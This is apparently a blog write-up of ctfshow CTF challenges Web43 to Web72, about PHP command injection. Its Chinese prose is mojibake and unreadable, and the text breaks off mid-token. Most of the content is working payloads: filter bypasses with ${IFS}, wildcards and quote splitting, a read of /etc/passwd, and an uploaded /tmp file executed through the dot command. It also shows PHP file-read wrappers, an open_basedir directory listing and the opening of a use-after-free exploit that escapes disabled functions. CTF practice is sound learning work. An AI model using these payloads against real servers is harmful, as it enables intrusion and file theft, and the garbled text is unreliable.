<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;     åˆ†å·</span><br><span class="line">|     åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span><br><span class="line">||    åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span><br><span class="line">&amp;     ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line">&amp;&amp;    ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line">%0a  æ¢è¡Œ</span><br></pre></td></tr></table></figure>

<p>åœ¨å‘½ä»¤åé¢åŠ ä¸Šå³å¯</p>
<h1 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h1><p>å¾ˆç®€å•ï¼Œè¿‡æ»¤äº†catç”¨tacå°±è¡Œnlä¹Ÿè¡Œ</p>
<h1 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h1><p>è¿‡æ»¤äº†flagï¼Œå¾ˆç®€å•çš„*ç»•è¿‡å°±è¡Œäº†</p>
<h1 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h1><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨${IFS}å°±è¡Œ</p>
<p>linuxé€‚ç”¨ç©ºæ ¼ç»•è¿‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ã€&lt;&gt;ã€%20ï¼ˆspaceï¼‰ã€%09ï¼ˆtabï¼‰ã€$IFS<span class="variable">$9</span>ã€<span class="variable">$&#123;IFS&#125;</span>ã€<span class="variable">$IFS</span>ã€&#123;<span class="built_in">cat</span>,/etc/passwd&#125;ã€%0aï¼ˆå›è½¦ï¼‰</span><br></pre></td></tr></table></figure>

<h1 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h1><p>è¿‡æ»¤äº†*</p>
<p>æ³•ä¸€ï¼Œç¬¦å·ç»•è¿‡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl<span class="string">&#x27;&#x27;</span>ag.php||</span><br></pre></td></tr></table></figure>

<p>æ³•äºŒï¼Œé€šé…ç¬¦ â€œ ? â€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">tac</span>%09fl?g.php||</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure>

<h1 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h1><p>è¿‡æ»¤äº†ä¸€å †æ²¡ç”¨çš„ï¼Œå’Œä¸Šé¢˜ä¸€æ ·å†™å°±è¡Œ</p>
<h1 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h1><p>è¿˜æ˜¯è¿‡æ»¤äº†ä¸€å †æ²¡ç”¨çš„</p>
<h1 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h1><p>è¿˜æ˜¯å’Œä¹‹å‰çš„ä¸€æ ·</p>
<h1 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h1><p>è¿‡æ»¤äº†%09æ¢åˆ«çš„å°±è¡Œï¼Œè¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h1><p>è¿‡æ»¤äº†å¤§äºå°äºè¿˜æ˜¯å·®ä¸å¤šçš„ï¼Œç”¨${IFS}å°±è¡Œ</p>
<p>è¿˜æœ‰å°±æ˜¯æ³¨æ„çš„æ˜¯flagæ²¡æœ‰phpåç¼€äº†</p>
<h1 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥äº†</p>
<h1 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h1><p>æ²¡æœ‰è¿‡æ»¤ï¼Ÿï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=/bin/?at$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=vi$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

<h1 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h1><p>åˆæ˜¯ä¸€ä¸ªæ¯”è¾ƒç¦»è°±çš„é¢˜ç›®</p>
<p>æœ‰ä¸‰ç§æ–¹æ³•å»å†™</p>
<p>ç¬¬ä¸€ç§å°±æ˜¯ç”¨base64å»è¯»æºæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br><span class="line">/???/????64 ????.???</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§å°±æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä»è€Œå»ä¸‹è½½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bzip2 flag,php</span><br><span class="line">/???/???/????2 ????.???</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰ç§å°±æ˜¯æœ€éš¾çš„äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æ„é€ ä¸€ä¸ªpostä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œè¿™æ˜¯ä¸ªä¸Šä¼ é¡µé¢ï¼Œé€‰æ‹©æ–‡ä»¶ä¸Šä¼ --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://dc1bfe3e-910b-4ad5-9130-db7f0cd7cca4.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ ä¸€ä¸ªpostå»ä¼ æ–‡ä»¶ï¼Œä¼šä¼ åˆ°ä¸´æ—¶ç›®å½•ä¸­ï¼Œå†ç”¨.å»æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ burp æ‹¦æˆªä¸­ï¼Œé€šè¿‡ GET æ–¹å¼ä¼ é€’ï¼š</span><br><span class="line">?c=.+/???/????????[@-[]</span><br><span class="line"></span><br><span class="line">phpKKKK</span><br><span class="line"></span><br><span class="line">å¹¶åœ¨ä¸Šä¼ æ–‡ä»¶å†…å®¹æ·»åŠ shå‘½ä»¤ï¼š</span><br><span class="line">#!/bin/sh</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>

<h1 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux ç³»ç»Ÿä¸‹ php æ¥æ”¶ä¸Šä¼ æ–‡ä»¶çš„ post åŒ…ï¼Œé»˜è®¤ä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ /tmp/ï¼Œæ–‡ä»¶å phpXXXXXXã€‚</span><br><span class="line">Linux ä¸­ .ï¼ˆç‚¹ï¼‰å‘½ä»¤ï¼Œæˆ–è€…å« periodï¼Œå®ƒçš„ä½œç”¨å’Œ source å‘½ä»¤ä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</span><br><span class="line">ascii ç è¡¨ä¸­ï¼Œå¤§å†™å­—æ¯ä½äº â€œ @ â€ ä¸ â€œ [ â€ ä¹‹é—´ã€‚</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸Šé¢˜çš„ç¬¬ä¸‰ç§æ–¹æ³•å³å¯</p>
<h1 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h1><p>è¿‡æ»¤äº†.ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸Šé¢ç”¨åˆ°çš„æ–¹æ³•</p>
<p>æˆ‘ä»¬åªéœ€è¦å‡‘å‡ºä¸€ä¸ª36å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$()å’Œ ` `  </span><br><span class="line">åœ¨ bash shell ä¸­ï¼Œ$( ) ä¸` ` (åå¼•å·) éƒ½å¯ç”¨åšå‘½ä»¤æ›¿æ¢ç”¨ã€‚</span><br><span class="line"></span><br><span class="line">ä¾‹å¦‚   </span><br><span class="line"></span><br><span class="line">version=$(uname -r)å’Œversion=`uname -r`éƒ½å¯ä»¥æ˜¯versionå¾—åˆ°å†…æ ¸çš„ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Linux Shell ä¸­ $(()) çš„ç”¨æ³•ã€‚  https://blog.csdn.net/u013402321/article/details/80333272</span><br><span class="line"></span><br><span class="line">ç®€å•æ¥è¯´ï¼Œ$(()) ç”¨æ¥åšæ•°å­¦è¿ç®—ã€‚ä¸” $(()) çš„å€¼ä¸º 0ã€‚</span><br><span class="line"></span><br><span class="line">~ åœ¨ $(()) ä¸­ä»£è¡¨æŒ‰ä½å–åï¼Œå³ $((~$(()))) å°±æ˜¯ 0 å–åï¼Œå³ -1ã€‚</span><br><span class="line"></span><br><span class="line">$(($((~$(())))$((~$(()))))) ä¹Ÿå°±æ˜¯ $((-1-1)) ä¸º -2ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;_&#125; =&quot;&quot; //è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br></pre></td></tr></table></figure>

<h1 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h1><p>systemè¢«ç¦æ‰äº†ï¼Œæ‰€ä»¥æ¢ç”¨åˆ«çš„</p>
<p>è§£æ³•1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">æˆ–</span><br><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br><span class="line">æˆ–</span><br><span class="line">c=file_get_contents(&#x27;falg.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>è§£æ³•2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h1><p>å’Œä¸Šé¢ä¸€é¢˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h1><p>è¿˜æ˜¯å’Œä¸Šé¢çš„ä¸€æ ·çš„</p>
<h1 id="Web61"><a href="#Web61" class="headerlink" title="Web61"></a>Web61</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web62"><a href="#Web62" class="headerlink" title="Web62"></a>Web62</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web63"><a href="#Web63" class="headerlink" title="Web63"></a>Web63</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web64"><a href="#Web64" class="headerlink" title="Web64"></a>Web64</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web65"><a href="#Web65" class="headerlink" title="Web65"></a>Web65</h1><p>è¿˜æ˜¯ä¸€æ ·çš„</p>
<h1 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h1><p>è¿™é¢˜å°±æ˜¯æ–°çš„äº†ï¼Œå°†ä¸Šé¢çš„å‡½æ•°éƒ½ç¦äº†ã€‚</p>
<p>è€Œä¸”é€šè¿‡highlight_fileå¾—çŸ¥æ–‡ä»¶åæ”¹å˜äº†ï¼Œæˆ‘ä»¬å°±å…ˆç”¨print_r(scandir(â€˜&#x2F;â€˜));æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶ï¼Œå†ç”¨highlightå»è¯»å–å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir()ï¼šæ‰«æç›®å½•</span><br></pre></td></tr></table></figure>

<h1 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„</p>
<p>é¢˜ç›®å°±ä¸è´´äº†ã€‚å’Œå‰å‡ é¢˜ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p>
<p>åŒºåˆ«åœ¨äºï¼Œ<code>print_r()</code> å‡½æ•°è¢«ç¦äº†ã€‚</p>
<p>é‚£å°±ç”¨ <code>var_dump()</code> å‡½æ•°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h1><p>ç›´æ¥æ–‡ä»¶åŒ…å«å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include()ï¼šè¡¨è¾¾å¼åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web69"><a href="#Web69" class="headerlink" title="Web69"></a>Web69</h1><p>è¿™é¢˜var_dumpè¢«ç¦äº†ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨var_export</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_exportï¼šè¾“å‡ºæˆ–è¿”å›å˜é‡çš„å¯è§£æå­—ç¬¦ä¸²è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure>

<h1 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h1><p>å’Œä¸Šé¢˜ä¸€æ¨¡ä¸€æ ·çš„</p>
<h1 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h1><p>è¿™é¢˜ç»™äº†æºç å°±å¯ä»¥å‘ç°æŠŠæ‰€æœ‰çš„è¾“å‡ºéƒ½æ¢æˆäº†é—®å·ï¼Œä½†æ˜¯ï¼Œç”±äºæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥åŠ ä¸€ä¸ªexit(0);åœ¨åè¾¹ï¼Œä»è€Œè·³è¿‡åè¾¹çš„æ›¿æ¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>

<h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬é¢˜è®¾ç½®äº† open_basedir()ï¼Œå°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„[ç›®å½•æ ‘](https://so.csdn.net/so/search?q=ç›®å½•æ ‘&amp;spm=1001.2101.3001.7020)ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚</span><br><span class="line">å› ä¸º ini_set() ä¹Ÿè¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥ open_basedir() ä¸èƒ½ç”¨ ini_set() é‡æ–°è®¾ç½®ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸èƒ½è®¿é—®/ï¼Œè®¿é—®è·¯å¾„è¢«é™åˆ¶äº†ï¼Œåªèƒ½å…è®¸è®¿é—®çš„æ˜¯/var/www/html/ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬é¢˜è®¾ç½®äº†open_basedirï¼Œå°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­,åŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å› ä¸ºini_set()ä¹Ÿè¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥open_basedirä¸èƒ½ç”¨ini_seté‡æ–°è®¾ç½®ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);  </span><br><span class="line">	<span class="comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">	<span class="comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line">	<span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)  	<span class="comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span></span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿™æ ·ä¹Ÿå°±å¯ä»¥å»è¯»å–åˆ°ç›¸åº”çš„ç›®å½•äº†</p>
<p>åé¢æ˜¯çœŸçš„å¥½éš¾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 